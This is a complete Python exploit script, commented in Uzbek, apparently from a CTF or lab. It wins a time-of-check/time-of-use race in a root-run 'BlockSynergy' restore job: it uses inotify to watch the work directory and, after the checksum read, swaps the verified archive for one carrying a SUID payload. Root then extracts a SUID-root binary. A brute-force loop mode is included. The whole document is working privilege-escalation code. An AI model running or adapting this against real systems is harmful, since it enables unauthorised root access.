#!/usr/bin/env python3
"""
BlockSynergy — TOCTOU race (to'g'rilangan versiya).

HANK sifatida ishga tushiring. U:
  1) /opt/blocksynergy/restore ni tegib restore job'ini trigger qiladi
  2) /var/restore_work ni inotify bilan kuzatadi
  3) root sha256sum o'qib bo'lgach (IN_CLOSE_NOWRITE), arxivni SUID payload bilan
     atomik os.replace() qilib almashtiradi
  4) root uni tar bilan extract qiladi -> /opt/blocksynergy/.diag (SUID root)

Ishlatish:
    python3 04_watcher.py            # inotify usuli
    python3 04_watcher.py --brute    # zaxira: qattiq loop usuli
"""
import ctypes
import os
import struct
import sys
import time

WATCH_DIR = "/var/restore_work"
TARGET    = "_opt_blocksynergy.tar.gz"
MAL       = "/tmp/restore_suid.tar.gz"
TRIGGER   = "/opt/blocksynergy/restore"
TIMEOUT   = 300

NUL = bytes([0])   # escape muammosidan qochish uchun

IN_CREATE       = 0x00000100
IN_CLOSE_WRITE  = 0x00000008
IN_CLOSE_NOWRITE= 0x00000010
IN_MOVED_TO     = 0x00000080


def trigger():
    try:
        os.unlink(TRIGGER)
    except OSError:
        pass
    open(TRIGGER, "w").close()
    print("[+] restore trigger qilindi", flush=True)


def brute():
    """Zaxira usul: qattiq loop bilan almashtirish."""
    trigger()
    dst = os.path.join(WATCH_DIR, TARGET)
    end = time.time() + TIMEOUT
    n = 0
    while time.time() < end:
        try:
            os.replace(MAL, dst)
            n += 1
        except OSError:
            pass
    print(f"[-] brute tugadi ({n} marta urinildi) — qayta ishga tushiring", flush=True)
    return 1


def main():
    if "--brute" in sys.argv:
        return brute()

    if not os.path.exists(MAL):
        sys.exit(f"[!] {MAL} yo'q — avval SUID arxivni yasang")

    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    fd = libc.inotify_init1(0)
    if fd < 0:
        sys.exit("[!] inotify_init1 failed — --brute bilan urinib ko'ring")

    mask = IN_CREATE | IN_CLOSE_WRITE | IN_CLOSE_NOWRITE | IN_MOVED_TO
    if libc.inotify_add_watch(fd, WATCH_DIR.encode(), mask) < 0:
        sys.exit(f"[!] watch failed: {os.strerror(ctypes.get_errno())}")

    trigger()
    print(f"[*] {WATCH_DIR} kuzatilmoqda (timeout {TIMEOUT}s)...", flush=True)

    downloaded = False
    start = time.time()
    while time.time() - start < TIMEOUT:
        data = os.read(fd, 4096)
        off = 0
        while off + 16 <= len(data):
            _wd, m, _cookie, nlen = struct.unpack_from("iIII", data, off)
            off += 16
            name = data[off:off + nlen].split(NUL, 1)[0].decode(errors="ignore")
            off += nlen

            if name != TARGET:
                continue

            if m & (IN_CREATE | IN_MOVED_TO):
                print(f"[+] arxiv paydo bo'ldi: {name}", flush=True)
            if m & IN_CLOSE_WRITE:
                print("[+] yozish tugadi (download/checksum)", flush=True)
                downloaded = True
            if (m & IN_CLOSE_NOWRITE) and downloaded:
                print("[*] ALMASHTIRILMOQDA...", flush=True)
                try:
                    os.replace(MAL, os.path.join(WATCH_DIR, TARGET))
                    print("[+] SWAP SUCCESS", flush=True)
                    return 0
                except OSError as e:
                    print("[-] swap failed:", e, flush=True)

    print("[-] timeout — qayta ishga tushiring yoki --brute sinang", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
